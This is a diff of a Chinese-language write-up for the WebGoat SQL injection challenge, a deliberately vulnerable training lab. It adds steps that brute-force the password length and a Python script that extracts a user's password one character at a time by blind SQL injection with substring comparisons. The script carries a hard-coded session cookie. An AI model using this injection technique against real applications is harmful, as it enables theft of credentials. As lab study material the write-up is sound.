@@ -4,7 +4,7 @@
 
 
 # 3  
-一直一个表要查另一个表的全部信息  
+已知一个表要查另一个表的全部信息  
 
 ![alt text](image.png)  
 
@@ -51,17 +51,36 @@ tom' and password is not null--
 ```  
 存密码不一定使用password，也可能是别的名字。这里就是password，并且提示已经存在了。如果没猜对，可以尝试字典爆破。  
 
-4. 关于如何用yakit爆破  
-- (1) 发送拦截请求，发送到fuzzer  
-![alt text](image-7.png)  
+4. 可以尝试爆破出密码的长度  
+![alt text](image-10.png)  
+发送后抓请求,设置payload，爆破，我设置从1到50  
+![alt text](image-11.png)  
+然后给响应大小排序，找到爆破结果，密码长度23  
+![alt text](image-12.png)  
 
-- (2) 选择字段，然后如图  
-![alt text](image-8.png)  
+5. 接下来可以去爆破密码的每一位,就是将密码的每一位都取出，然后看是什么字符，比如注入substring(password,1,1)=a，看响应的结果判断第一位是不是a，同理其他字母比较，一但是真就确定了这一位,执行下面脚本可以爆破出密码,我是参考了别人的脚本。如果是真，会返回"already exists please",如果找到这个字符就说明找到了当前位的字符，用res.text.find()函数来查找字符。  
+```python
+import requests
+str_list = [chr(i) for i in range(97,123)]
 
-- (3) 然后选择字典，如果自己的字典没有导入，点击齿轮添加。我的字典是name，事实我没有字典，我就想试试。  
-![alt text](image-9.png)  
+url = "http://192.168.88.1:8080/WebGoat/SqlInjectionAdvanced/challenge"
 
-- (4) 点击插入，然后发送请求
+password = ""
+for i in range(1,24):
+    for s in str_list:
+        putdata =f"username_reg=tom' and substring(password,{i},1)='{s}'-- &email_reg=tom%40tom.com&password_reg=123&confirm_password_reg=123"
+        headers = {"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Origin":"http://192.168.88.1:8080","Accept-Encoding":"gzip, deflate","Cookie":"JSESSIONID=-6nOkXrcqqrouZwvlF8DpW7jzUOa6HtYvse2vugP","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36","Accept-Language":"zh-CN,zh;q=0.9","Referer":"http://192.168.88.1:8080/WebGoat/start.mvc?username=webgoat"}
+        res = requests.put(url,putdata,headers=headers)
+        resp = res.text.find("already exists please")
+        if resp != -1:
+            password += s
+            continue
+
+
+print(password)
+```  
+![alt text](image-13.png)
+
 
 
 
